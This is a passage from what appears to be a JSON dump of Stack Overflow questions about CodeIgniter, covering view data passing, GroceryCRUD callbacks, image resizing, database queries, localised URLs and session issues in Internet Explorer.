{\n\nfunction __construct()\n{\n    parent::__construct();\n    $this-&gt;load-&gt;model('users_model','',TRUE);\n    $this-&gt;load-&gt;library('email');\n}\n\nfunction index()\n{\n    //This method will have the credentials validation\n    $this-&gt;load-&gt;library('form_validation');\n\n    $this-&gt;form_validation-&gt;set_rules('Login', 'Login', 'trim|required|xss_clean|callback_check_database|min_length[6]|strtolower|callback_username_not_exists');\n    $this-&gt;form_validation-&gt;set_rules('Haslo', 'Haslo', 'trim|required|xss_clean|min_length[6]');\n    $this-&gt;form_validation-&gt;set_rules('Powtorz_Haslo', 'Powtorz haslo', 'trim|required|xss_clean|matches[Haslo]|min_length[6]');\n    $this-&gt;form_validation-&gt;set_rules('Imie', 'Imie', 'trim|required|xss_clean|min_length[2]');\n    $this-&gt;form_validation-&gt;set_rules('Nazwisko', 'Nazwisko', 'trim|required|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('Email', 'Email', 'trim|required|xss_clean|valid_email|min_length[6]');\n    $this-&gt;form_validation-&gt;set_rules('Data_urodzenia', 'Data urodzenia', 'trim|required|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('Telefon', 'Telefon', 'trim|required|xss_clean|min_length[8]');\n    $this-&gt;form_validation-&gt;set_rules('Miasto', 'Miasto', 'trim|required|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('Ulica', 'Ulica', 'trim|required|xss_clean|min_length[6]');\n    $this-&gt;form_validation-&gt;set_rules('Kod_pocztowy', 'Kod pocztowy', 'trim|required|xss_clean');\n    $this-&gt;form_validation-&gt;set_error_delimiters('&lt;span style=\"color: red; font-size:    12px; ; line-height: 14px; \"&gt;', '&lt;/span&gt;');\n    $this-&gt;form_validation-&gt;set_error_delimiters('&lt;li&gt;', '&lt;/li&gt;');\n    $data['heading'] = \"My Real Heading\";  \n\n    if($this-&gt;form_validation-&gt;run() == FALSE)\n    {\n        $this-&gt;load-&gt;view('register/register_open',$data);\n    }\n    else\n    {\n        return false;  //this is not important\n    }\n}\n</code></pre>\n\n<p><strong>>> My view open - register_open</strong></p>\n\n<pre><code>&lt;?php\n$this-&gt;load-&gt;view('mains/header'); \n$this-&gt;load-&gt;view('login/loggin');\n$this-&gt;load-&gt;view('mains/menu');\n$this-&gt;load-&gt;view('left_column/left_column_before');\n$this-&gt;load-&gt;view('left_column/menu_left');\n$this-&gt;load-&gt;view('left_column/left_column');\n$this-&gt;load-&gt;view('center/center_column_before');\n$this-&gt;load-&gt;view('register/register_view',$data);\n$this-&gt;load-&gt;view('center/center_column');\n$this-&gt;load-&gt;view('right_column/right_column_before');\n$this-&gt;load-&gt;view('right_column/right_column');\n$this-&gt;load-&gt;view('mains/footer');\n?&gt;\n</code></pre>\n\n<p><strong>>>My view - register_view</strong> </p>\n\n<pre><code>&lt;?php echo form_open('verifyregistration/index'); ?&gt;\n    &lt;form&gt;\n        &lt;label for=\"username\"&gt;Login:&lt;/label&gt;\n        &lt;input type=\"text\" size=\"25\" id=\"Login\" name=\"Login\" set_value='Login' /&gt; \n        .\n        .\n        .\n\n        &lt;legend&gt;\n            &lt;input type=\"checkbox\" id=\"regulamin\" name=\"Regulamin\" onclick=\"this.form.elements['Wyslij'].disabled = !this.checked\" /&gt; \n            Akceptuję regulamin serwisu. &lt;/legend&gt;\n\n            &lt;label&gt;&amp;nbsp;&lt;/label&gt;\n            &lt;input type=\"submit\" name=\"Wyslij\" value=\"Wyslij\" disabled=\"disabled\"/&gt;\n            &lt;label&gt;&amp;nbsp;&lt;/label&gt;\n\n        &lt;legend&gt;\n            &lt;&lt;?php echo $heading;?&gt;\n        &lt;/legend&gt;\n    &lt;/form&gt;\n</code></pre>\n\n<p>And I have errors:</p>\n\n<p>Severity: Notice\nMessage: Undefined variable: data\nFilename: register/register_open.php\nLine Number: 9\nthis line-> <code>$this-&gt;load-&gt;view('register/register_view',$data);</code></p>\n\n<p>Severity: Notice\nMessage: Undefined variable: heading\nFilename: register/register_view.php\nLine Number: 48\nthis line-> <code>&lt;&lt;?php echo $heading;?&gt;</code></p>\n\n<p>How I can pass the data to another view?</p>\n"},{"tags":["php","codeigniter","public"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13078154,"title":"CodeIgniter - I have a public function in a controller but i don't want people requesting it via a URL","body":"<p>CodeIgniter - I have a public function in a controller but I don't want people requesting it via a URL.</p>\n\n<p><strong>i.e., I have this</strong>:</p>\n\n<pre><code>public function process_images($images) {\n  ...\n}\n</code></pre>\n\n<p>Which I need to be public because I am using GroceryCRUD and using a callback - setting it to protected means that GroceryCRUD won't call it using its callback. </p>\n\n<p>So it looks like it has to be public. How do I declare it public but make sure that CodeIgniter doesn't call it from a URL request (i.e., if I went to <em><code>http://site.com/images/process_images/test.jp</code></em> it wouldn't call <code>::process_images('test.jpg'))</code></p>\n"},{"tags":["php","html","mysql","codeigniter","grocery-crud"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":13071171,"title":"CodeIgniter + Grocery Crud - how to set fields to either on/off (bool, checkbox) and also how to set it to be a select dropdown of numbers (1-10)","body":"<p>CodeIgniter + Grocery Crud - how to set fields to either on/off (bool, checkbox) and also how to set it to be a select dropdown of numbers (1-10) ?</p>\n\n<p>I have grocerycrud set up, and on some fields they are either:</p>\n\n<p>bool values (but set as ints or varchars so groceycrud shows it as a </p>\n\n<p>or </p>\n\n<p>select dropdown with values 0-10 (these are stored as ints, but it is for a rating system)</p>\n\n<p>any ideas?</p>\n\n<p>thanks</p>\n"},{"tags":["php","codeigniter","grocery-crud"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":13071731,"title":"GroceryCRUD - how to set variables in a callback? (I upload a file, want to resize it 3 times and put all 3 in the db - how do i save that data)?","body":"<p>I am using codeigniter + grocerycrud. I have a callback for image uploads.</p>\n\n<p>I upload one image in the form, but want to do this:</p>\n\n<p>copy it 3 times</p>\n\n<p>resize each one a certain size</p>\n\n<p>then save each one in the database.</p>\n\n<p>any ideas how to do this? The callback only seems to let me edit the image (and do things like that) - not change the varaiables of the submitted data so we can save the manipulated data.</p>\n\n<p>looking at their callback tutorial it looks like most call backs do something like this:</p>\n\n<pre><code>function callback_for_this_field($posted_data) {\n\n$posted_data = $posted_data .= \"append me\";\n\nreturn $posted_data;\n}\n</code></pre>\n\n<p>(ie returning the modified data)</p>\n\n<p>but the upload callback just returns true</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13071189,"title":"Execute second statement if the first one holds","body":"<p>If a directory does not exist, i create the directory and save a file, i can also just save a file if the directory exists. One file should be created at a time not all at the same time as the code below does. If the first file is created now then the next should only be created when the function is called. The files are Named R1,R2....Rn. How can I achieve this, This creates them all at the same time</p>\n\n<pre><code>$fileName1=$fileName1='somedir/'.$thedir.'/'.$thefile.'_R1.xlsx';\n\n...\n\nif (!dir($dirName)) \n{\n    mkdir('somedir/' . thedir, 0777);\n    $objWriter-&gt;save($fileName);\n}\n\nif (dir($dirName) &amp;&amp; (!file_exists($fileName))) \n{\n    $objWriter-&gt;save($fileName);\n} \n\nif (dir($dirName) &amp;&amp; file_exists($fileName)) \n{\n    $objWriter-&gt;save('somedir/' . $thedir . '/' . $thefile . '_R1.xlsx');\n}\n\nif (dir($dirName) &amp;&amp; file_exists($fileName1)) \n{\n    $objWriter-&gt;save('somedir/' . $thedir . '/' . $thefile . '_R2.xlsx');\n}\n\n...\n</code></pre>\n"},{"tags":["php","mysql","codeigniter","activerecord","mysqli"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13072073,"title":"MySQL DISTINCT with codeigniter... Very strange behaviour","body":"<p>Ok just to keep this simple I need to loop through the <code>DISTINCT</code> results of each column in a this table called <code>PRINTS</code> Now here is the strange part ... </p>\n\n<pre><code>$this-&gt;db-&gt;distinct();\n$this-&gt;db-&gt;select('PRINTS.COLOR');\n$q = $this-&gt;db-&gt;get('PRINTS');\nreturn $q-&gt;result();\n</code></pre>\n\n<p>Ok <code>COLOR</code> is a COL in the table AS IS <code>SIZE</code> and <code>PAPER</code>  --- Ok get ready because this is where it gets strange... </p>\n\n<p>If I do <code>$this-&gt;db-&gt;select('PRINTS.SIZE');</code> I am able to loop through the <code>DISTINCT</code> values for <code>SIZE</code> in the table. </p>\n\n<p><strong>HOWEVER</strong></p>\n\n<p>If I do <code>$this-&gt;db-&gt;select('COLOR');</code> I get ERROR: A Database Error Occurred / Error Number: 1054 / \nUnknown column <code>'COLOR' in 'field list'</code></p>\n\n<p>Same thing happens for <code>PAPER</code> too -- It seems that only <code>SIZE</code> works as it should. According to CODEIGNITER DOCS,  I Need to do: <code>$this-&gt;db-&gt;select('COLOR, PAPER, SIZE');</code> But I'm getting an unknown <code>COL</code> error. Spelling is correct. Can anyone shed light on this? What is going on? TY</p>\n"},{"tags":["codeigniter","image-processing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13072891,"title":"CodeIgniter: Image manipulation class doesn't work twice","body":"<p>I'm having trouble trying to resize an image and then create a thumb.</p>\n\n<p>Both functions are working separately but when trying to call them both, only the first call works. No Thumb is created, why ?</p>\n\n<p>Here is my controller:</p>\n\n<pre><code>if($this-&gt;upload-&gt;do_upload()){\n\n                // Si oui, tout va bien\n\n                //Update DB\n                $pictureData = $this-&gt;upload-&gt;data();\n                if($pictureData['file_name']!=''){\n                    //On resize l'immage\n                        //On charge la librarie\n                        $this-&gt;load-&gt;library('thumbs');\n\n                        $this-&gt;thumbs-&gt;resize($pictureData['full_path'], 300, 600);\n\n                    $News['image']=$pictureData['file_name'];\n\n                    //On crée un Thumbnail:\n                        // on envoi le full path\n                        if($this-&gt;thumbs-&gt;create($pictureData['full_path']))\n\n                        // on stock le path recu\n                    $News['thumb'] = $pictureData['raw_name'].'_thumb'.$pictureData['file_ext'];\n                }\n            }\n</code></pre>\n\n<p>And here is the library I've created for both functions:</p>\n\n<pre><code>   &lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Thumbs\n{\n\n    function __construct()\n    {\n        $CI =&amp; get_instance();\n        $this-&gt;load-&gt;library('image_lib');\n    }\n\n    public function create($picPath) {\n\n        $CI =&amp; get_instance();\n\n        $config['image_library'] = 'gd2';\n        $config['source_image'] = $picPath;\n        $config['maintain_ratio'] = TRUE;\n        $config['create_thumb'] = TRUE;\n        $config['width']     = 100;\n        $config['height']   = 100;\n\n        $CI-&gt;image_lib-&gt;clear();\n        $CI-&gt;image_lib-&gt;initialize($config); \n\n        if(!$CI-&gt;image_lib-&gt;resize()){\n            $CI-&gt;session-&gt;set_flashdata('flashError',  $CI-&gt;image_lib-&gt;display_errors());\n            return False;\n        }\n        $CI-&gt;image_lib-&gt;clear();\n        Return True;\n\n    }\n\n    public function resize($picPath, $x, $y) {\n\n        $CI =&amp; get_instance();\n\n        $config1['image_library'] = 'gd2';\n        $config1['source_image']    = $picPath;\n        $config1['maintain_ratio'] = TRUE;\n\n        if($x!=0)\n            $config1['width']    = $x;\n\n        if($y!=0)\n            $config1['height']  = $y;\n\n        $CI-&gt;image_lib-&gt;clear();\n        $CI-&gt;image_lib-&gt;initialize($config1); \n\n        if(!$CI-&gt;image_lib-&gt;resize()){\n            $CI-&gt;session-&gt;set_flashdata('flashError',  $CI-&gt;image_lib-&gt;display_errors());\n            return False;\n        }\n        $CI-&gt;image_lib-&gt;clear();\n        Return True;\n    }\n}\n</code></pre>\n\n<p>So if I call only one, it works fine, wether it is the create or resize function. Otherwise, if I try to call them both, only the first function that has been called works.</p>\n\n<p>EDIT: Thanks to fccotech, I made it. here is the solution he came with:</p>\n\n<pre><code>&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Thumbs\n{\n\n    function __construct()\n    {\n        $this-&gt;CI =&amp; get_instance();\n        $this-&gt;CI-&gt;load-&gt;library('image_lib');\n    }\n\n    public function create($picPath, $picName) {\n\n        $config =array();\n\n        $config['image_library'] = 'gd2';\n        $config['source_image'] = $picPath;\n        $config['maintain_ratio'] = TRUE;\n        $config['create_thumb'] = TRUE;\n        $config['width']     = 100;\n        $config['height']   = 100;\n        $config['new_image'] =  $picName;\n\n        // $CI-&gt;image_lib-&gt;clear();\n        $this-&gt;CI-&gt;image_lib-&gt;initialize($config); \n\n        if(!$this-&gt;CI-&gt;image_lib-&gt;resize()){\n            $this-&gt;CI-&gt;session-&gt;set_flashdata('flashError',  $this-&gt;CI-&gt;image_lib-&gt;display_errors());\n            return False;\n        }\n        $this-&gt;CI-&gt;image_lib-&gt;clear();\n        Return True;\n\n    }\n\n    public function resize($picPath, $x, $y) {\n\n        $config1 = Array();\n\n        $config1['image_library'] = 'gd2';\n        $config1['source_image']    = $picPath;\n        $config1['maintain_ratio'] = TRUE;\n\n        if($x!=0)\n            $config1['width']    = $x;\n\n        if($y!=0)\n            $config1['height']  = $y;\n\n        // $CI-&gt;image_lib-&gt;clear();\n        $this-&gt;CI-&gt;image_lib-&gt;initialize($config1); \n\n        if(!$this-&gt;CI-&gt;image_lib-&gt;resize()){\n            $this-&gt;CI-&gt;session-&gt;set_flashdata('flashError',  $this-&gt;CI-&gt;image_lib-&gt;display_errors());\n            $this-&gt;CI-&gt;image_lib-&gt;clear();\n            return False;\n        }\n        $this-&gt;CI-&gt;image_lib-&gt;clear();\n        Return True;\n    }\n}\n</code></pre>\n"},{"tags":["php","security","codeigniter","web-applications","frameworks"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":101,"score":0,"question_id":13073970,"title":"Good Php Framework for strong security","body":"<p>I'm trying to choose a framework that provides really good security of web applications, protects against as much of OWASP Top-10 as possible, such as:</p>\n\n<ul>\n<li>Sql Injection</li>\n<li>XSS </li>\n<li>CSRF</li>\n<li>Authentication</li>\n<li>Authorization</li>\n<li>etc.</li>\n</ul>\n\n<p>the thing is I've tried researching really heavily:\nCakephp, Zend, Yii, Code Igniter, Kohana and some have <em>basic</em> authentication, maybe a little authorization, but nothing for any application that needs solid code-security.</p>\n\n<p>Is most of the vulnerability types above currently secured by only writing custom code in these frameworks? </p>\n\n<p>This is kinda my first experience with using frameworks, everything up til this point has been custom php web apps. My whole thought for php-frameworks was it was going to be <em>easy</em> to protect against these vulnerabilities, given it isn't <em>natively</em>, why use one? Or is there a framework out there I'm not looking at which is better than those listed above for strong web app security? Thanks</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13073954,"title":"Codeigniter restrict to insert into other user's data","body":"<p>A user can submit his data, after login. There is two tables in mysql: items, categories. Categories has a field: user_id, but in item table, there isn't, every item should belongs to a category.</p>\n\n<p>When a user submitting a category, its fine, i get the user id from session, and inserting it. \nWhen he submits an item, i set the category_id for it.</p>\n\n<p>The problem is, the user can simply rewrite the category_id (javascript, on the frontend, click on a category : set the category_id), and submit the item into a category which is not related to him.</p>\n\n<p>Two solutions what i'm thinking (but i haven't made like this):</p>\n\n<p><strong>When the user inserts an item, i check the category relation, and if it's not the user's one, its exit.</strong></p>\n\n<p><strong>Add the user_id field into the items table too</strong> (not looking as a good option).</p>\n\n<p>What is the good way or what's the proper/common solution in this case?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":25,"score":2,"question_id":13072759,"title":"Internationalised URLs with Codeigniter","body":"<p>I'm trying to add selected <em>language code</em> to the URL instead of storing it in a <em>session</em> or <em>cookie</em>.</p>\n\n<p>My first time example below sets language manually but I want to make it dynamic based on user selection. How can I produce links below?</p>\n\n<p>I know that Codeigniter URLs works as <code>base_url/class_name/function_name/parametters</code></p>\n\n<p><strong>Note:</strong> <em>My base URL is : <code>http://localhost/internationalisation/</code></em></p>\n\n<pre><code>http://localhost/internationalisation/en/\nhttp://localhost/internationalisation/en/welcome\nhttp://localhost/internationalisation/en/products/1\nhttp://localhost/internationalisation/en/products/2\nhttp://localhost/internationalisation/en/aboutus\nhttp://localhost/internationalisation/en/contactus\nOR spanish version\n</code></pre>\n\n<p><strong>CONTROLLER</strong></p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Welcome extends CI_Controller\n{\n    public function __construct()\n    {\n        parent::__construct();\n\n        $this-&gt;load-&gt;helper('url');\n\n        //$this-&gt;lang-&gt;load('en', 'english');\n        $this-&gt;lang-&gt;load('es', 'spanish');\n    }\n\n    public function index()\n    {\n        $this-&gt;load-&gt;view('welcome_message');\n    }\n}\n\n/* EoF */\n</code></pre>\n\n<p><strong>VIEW</strong></p>\n\n<pre><code>&lt;a href=\"&lt;?php echo site_url('en'); ?&gt;\"&gt;English&lt;/a&gt;\n&lt;br /&gt;\n&lt;a href=\"&lt;?php echo site_url(); ?&gt;es\"&gt;Spanish&lt;/a&gt;\n\n&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;\n\n&lt;h1&gt;&lt;?php echo $this-&gt;lang-&gt;line('welcome'); ?&gt;&lt;/h1&gt;\n</code></pre>\n"},{"tags":["php","image","codeigniter","upload"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":12627850,"title":"Codeigniter upload image, then manipulate the image 3 times","body":"<p>I am working on a gallery concept for something I am building up, and I am trying to figure out what would be my best approach at taking an image file uploaded to the server, and then converting it 3 times to different sizes within a set ratio with a max height or width. Depending on which is greater.</p>\n\n<p>So the upload class, and image manipulation class are pretty straight forward on a one to one basis, though I know you can loop through an array and process things over and over. However, the tricky part is the 3 different sizes. </p>\n\n<p>Essentially I plan to take the uploaded file and store it in a different directory than uploaded to with a new name and all else we will call that dir \"org\". Then I want to take this original, keeping the file name consistant with the original after renaming it, and then resize the original within a certain ratio with a max size of either certain width or height pending on which is greater. Which the image class handles, now the part thats confusing me, is how do I do this 3 times one smaller then the next. I want a \"lrg\", \"med\", \"sml\" folder set. Would I build those into the same function some how or would I pass one upon completion to the next function and so on? If its all in the same function, then thats where I am confused to how I should handle this.</p>\n\n<p>Also for reference I haven't tried much outside of the standard information found on the CI docs, as I am trying to think this through before getting deep into the code and finding out it wont work.</p>\n"},{"tags":["php","arrays","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13072853,"title":"Array loses values when in foreach","body":"<p>This has me stumped. I can print_r the array called <code>$item_pages</code> and it outputs all of the keys and values correctly. However, once that array is used within the foreach, it seems to become empty. This is the array when I print_r outside of the foreach:</p>\n\n<pre><code>Array ( [0] =&gt; 1 [1] =&gt; 6 [2] =&gt; 12 [3] =&gt; 15 [4] =&gt; 16 [5] =&gt; 17 [6] =&gt; 18 [7] =&gt; 19 [8] =&gt; 78 [9] =&gt; 79 [10] =&gt; 87 [11] =&gt; 90 [12] =&gt; 94 [13] =&gt; 95 [14] =&gt; 98 [15] =&gt; 99 [16] =&gt; 102 [17] =&gt; 103 [18] =&gt; 105 [19] =&gt; 107 [20] =&gt; 108 [21] =&gt; 110 [22] =&gt; 111 [23] =&gt; 112 [24] =&gt; 113 [25] =&gt; 114 [26] =&gt; 119 [27] =&gt; 120 [28] =&gt; 121 [29] =&gt; 125 [30] =&gt; 126 [31] =&gt; 134 [32] =&gt; 135 [33] =&gt; 136 [34] =&gt; 138 [35] =&gt; 142 [36] =&gt; 186 [37] =&gt; 193 [38] =&gt; 197 [39] =&gt; 198 [40] =&gt; 199 [41] =&gt; 206 [42] =&gt; 327 [43] =&gt; 452 [44] =&gt; 470 [45] =&gt; 487 [46] =&gt; 601 [47] =&gt; 614 [48] =&gt; 630 [49] =&gt; 684 [50] =&gt; 726 [51] =&gt; 727 [52] =&gt; 789 [53] =&gt; 871 )\n</code></pre>\n\n<p>Here's the controller:</p>\n\n<pre><code>    public function view_item_pages() {\n\n    if ($this-&gt;input-&gt;is_ajax_request()) {\n\n      $item_id = $this-&gt;input-&gt;post('item_id');\n      $this-&gt;data['item_id'] = $item_id;\n      $this-&gt;data['pages'] = $this-&gt;affiliate_model-&gt;get_all_affiliates();\n      $this-&gt;data['item_pages'] = $this-&gt;item_model-&gt;get_item_pages($item_id);\n\n      $this-&gt;load-&gt;view('/admin/item/pages', $this-&gt;data);\n\n    }\n\n  }\n</code></pre>\n\n<p>Here's the view:</p>\n\n<pre><code>&lt;fieldset&gt;\n    &lt;table id=\"all-pages\" class=\"table table-striped table-bordered\"&gt;\n        &lt;thead&gt;\n          &lt;tr&gt;\n            &lt;th&gt;&lt;input type=\"checkbox\" class=\"checkbox\" id=\"select_all\"&gt;&lt;/th&gt;\n            &lt;th&gt;ID&lt;/th&gt;\n            &lt;th&gt;Name&lt;/th&gt;\n          &lt;/tr&gt;\n        &lt;/thead&gt;\n        &lt;tbody&gt;\n\n        &lt;?php foreach ($pages as $page): \n\n            $checked = FALSE;\n\n            if (!empty($item_pages)) {\n                if (in_array($page['aff_id'], $item_pages)) {\n                    $checked = TRUE;\n                }\n            }\n        ?&gt;\n              &lt;tr&gt;\n                &lt;td&gt;&lt;?php echo form_checkbox('page', $page['aff_id'], $checked); ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo $page['aff_id']; ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo $page['name']; ?&gt;&lt;/td&gt;\n              &lt;/tr&gt;\n\n        &lt;?php endforeach; ?&gt;\n\n        &lt;/tbody&gt;\n    &lt;/table&gt;\n&lt;/fieldset&gt;\n</code></pre>\n\n<p>So if I do the following, the array works:</p>\n\n<pre><code>    &lt;?php print_r($item_pages); ?&gt;\n\n    &lt;?php foreach ($pages as $page):\n\n        $checked = FALSE;\n\n        if (!empty($item_pages)) {\n            if (in_array($page['aff_id'], $item_pages)) {\n                $checked = TRUE;\n            }\n        }\n    ?&gt;\n</code></pre>\n\n<p>If I do this, it doesn't return anything, it's like doing <code>echo '';</code>:</p>\n\n<pre><code>   &lt;?php foreach ($pages as $page):\n\n        print_r($item_pages);\n\n        $checked = FALSE;\n\n        if (!empty($item_pages)) {\n            if (in_array($page['aff_id'], $item_pages)) {\n                $checked = TRUE;\n            }\n        }\n    ?&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","expressionengine"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":159,"score":0,"question_id":5993686,"title":"Using conditional on $_SERVER['HTTP_HOST'] in ExpressionEngine config file - not working","body":"<p>I am using ExpressionEngine 2 (build: 20101220) with Multisite Manager (v2.0 build: 20101215). I have one Main site and 30 subsites. I want users to be able to log in to any of the subsites and, at the same time, be logged in to the Main site. There is a way to do this so the user is logged in to all sites in the config file but the browser throws an error when it has do 30 redirects to set the cookies.</p>\n\n<p>So, I have created a conditional so that, based on which domain you are logging into, it will create the correct list for $config['multi_login_sites']:</p>\n\n<pre><code>$domain = $_SERVER['HTTP_HOST'];\nif ($domain == 'www.SiteB.com') {\n    $config['multi_login_sites'] = \"http://www.MainSite.com/|http://www.SiteB.com/\"; \n} else {\n    $config['multi_login_sites'] = \"http://www.MainSite.com/\";\n} \n</code></pre>\n\n<p>I can display $config['multi_login_sites'] on the page and can see that when I'm on SiteB, it is correct. But when I log in, I get these errors and the redirect doesn't work:</p>\n\n<pre><code>A PHP Error was encountered\nSeverity: Notice\nMessage: Undefined index: 2\nFilename: member/mod.member_auth.php\nLine Number: 243\n\nA PHP Error was encountered\nSeverity: Notice\nMessage: Undefined index: 2\nFilename: member/mod.member_auth.php\nLine Number: 244  \n</code></pre>\n\n<p>Those lines in mod.member_auth.php are the ones below that say 'redirect' and 'link':</p>\n\n<pre><code>// We're done.\n$data = array( 'title'  =&gt; $this-&gt;EE-&gt;lang-&gt;line('mbr_login'),\n       'heading'    =&gt; $this-&gt;EE-&gt;lang-&gt;line('thank_you'),\n       'content'    =&gt; $this-&gt;EE-&gt;lang-&gt;line('mbr_you_are_logged_in'),\n       'redirect'   =&gt; $sites[$this-&gt;EE-&gt;input-&gt;get('orig')],\n       'link'       =&gt; array($sites[$this-&gt;EE-&gt;input-&gt;get('orig')], $this-&gt;EE-&gt;lang-&gt;line('back'))\n             );\n</code></pre>\n\n<p>If I get rid of the conditional statement and just use \n    $config['multi_login_sites'] = \"http://www.MainSite.com/|http://www.SiteB.com/\"; \nthen it works fine.</p>\n\n<p>It seems like this is a PHP issue but maybe it's an EE/CodeIgniter thing? Is there something I just don't know about using this type of variable in a conditional?</p>\n"},{"tags":["php","internet-explorer","codeigniter","session"],"answer_count":4,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":807,"score":1,"question_id":10288895,"title":"Codeigniter session issues in Internet Explorer","body":"<p>I have a CI application that uses the CI session class. Here's the process I'm having trouble with:</p>\n\n<ol>\n<li>Users loads page</li>\n<li>Ajax request to get record from DB</li>\n<li>Set userdata variable with that record's ID &amp; do various DB stuff</li>\n<li>User refreshes the page</li>\n<li>Ajax request to get record from DB based on the session variable of the previous record (same record can not be passed back twice in a row)</li>\n<li>re-set userdata variable to new record's ID</li>\n</ol>\n\n<p>etc. etc.</p>\n\n<p>This works perfectly in chrome and FF. But obviously when I come to test in IE - doesn't work. </p>\n\n<p>The ajax request is executed and the first record is retreived. At this point the session variable has been set. User refreshes but the same record remains. </p>\n\n<p>At this point if I clear session cookies and refresh the new record is retrieved.</p>\n\n<p>I've tried changing:</p>\n\n<pre><code>$config['sess_cookie_name']     = 'ci_session';\n</code></pre>\n\n<p>to</p>\n\n<pre><code>$config['sess_cookie_name']     = 'cisession';\n</code></pre>\n\n<p>Like I saw in another post but no luck. Also tried using DB for session storage but still no luck.</p>\n\n<p>Here is the problem page: <a href=\"http://givestream.co.uk/stream\" rel=\"nofollow\">http://givestream.co.uk/stream</a></p>\n\n<p>Load this in chrome or FF and either refresh or hit the 'Next' button and you'll see it retrieves a new charity. Try this in IE and it doesn't work unless you clear session cookies.</p>\n\n<p>JS function to get record:</p>\n\n<pre><code>function get_matches(){\n    var charity;\n    var user_total;\n    jQuery.get(\"/stream/get_charity/\", function(data){\n\n        charity = data.charity;\n        user_total = charity.user_totals;\n\n        /** CHANGE URL **/\n\n        if (history.pushState) {\n            window.history.pushState(\"object or string\", \"Title\", \"/stream/\"+charity.slug);\n        }\n\n        /*****************/\n\n        // can user accept?\n        if(charity.can_donate == 0){\n            // No\n            jQuery('.alert-message').show();\n        } else{\n            jQuery('.alert-message').hide();\n        }\n\n        // Charity Binding\n        jQuery('p#char_modal_description').html(charity.description);\n        jQuery('.char_more_link').attr('id', charity.id);\n        jQuery('h1#char_name').html(charity.char_name);\n        jQuery('h2#char_modal_header').html(charity.char_name);\n        jQuery('p#char_desc').html(charity.description);\n        jQuery('#website').html('&lt;label&gt;Website&lt;/label&gt;&lt;a href=\"'+charity.website+'\" style=\"color:#08C;\" target=\"_blank\"&gt;'+charity.website+'&lt;/a&gt;');\n        jQuery('#char_total').text('\\u00A3'+charity.total);\n        jQuery('#donors').html(charity.recent_donors);\n        jQuery('#fans').html(charity.recent_fans);\n\n        if (typeof user_total !== 'undefined') {\n            jQuery('#total_char_month').text('\\u00A3'+user_total.total_char_month);\n            jQuery('#total_char_alltime').text('\\u00A3'+user_total.total_char_alltime);\n            var has_user_seen_stream_notice = user_total.has_user_seen_stream_notice;\n\n            if(has_user_seen_stream_notice == false){\n                jQuery('#stream_help').show();\n            } \n        } else{\n            jQuery('#total_char_month').text('\\u00A3'+0);\n            jQuery('#total_char_alltime').text('\\u00A3'+0);\n        }\n\n        /** TWITTER SHARE BUTTON CHANGE URL **/\n\n        var twitter = '&lt;a href=\"https://twitter.com/share\" class=\"twitter-share-button\" data-url=\"http://givestream.co.uk/stream/'+charity.slug+'\" data-via=\"givestreamuk\" data-hashtags=\"socialgiving\"&gt;Tweet&lt;/a&gt;';\n        jQuery('#twitter_share').html(twitter);\n\n        var jstext = '!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=\"//platform.twitter.com/widgets.js\";fjs.parentNode.insertBefore(js,fjs);}}(document,\"script\",\"twitter-wjs\");';\n\n        var script   = document.createElement(\"script\");\n        script.type  = \"text/javascript\";\n        script.text  = jstext;\n        jQuery('#twitter_share').append(script);\n\n        // *************************************//\n\n\n        /** FACEBOOK SHARE WIDGET **/\n\n            var fb = '&lt;iframe src=\"//www.facebook.com/plugins/like.php?href=http://givestream.co.uk/stream/'+charity.slug+'&amp;amp;send=false&amp;amp;layout=standard&amp;amp;width=280&amp;amp;show_faces=false&amp;amp;action=like&amp;amp;colorscheme=light&amp;amp;font&amp;amp;height=35&amp;amp;appId=119083868224729\" scrolling=\"no\" frameborder=\"0\" style=\"border:none; overflow:hidden; width:280px; height:35px;\" allowTransparency=\"true\"&gt;&lt;/iframe&gt;';\n            jQuery('#fb_share').html(fb);\n\n\n        // ***********************//\n\n\n        jQuery('#char_website').html(charity.website);\n\n        jQuery('#sectors').html('&lt;label&gt;Tags&lt;/label&gt;'+charity.sectors);\n        jQuery('#permalink').val('http://givestre.am/stream/'+charity.slug);\n\n        jQuery('#refresh').activity(false);\n\n        get_charity_gallery();\n        get_charity_shouts();\n\n    }, 'json');\n\n    return;\n}\n</code></pre>\n"},{"tags":["php","ajax","codeigniter"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13070481,"title":"How to hide ajax page from public access 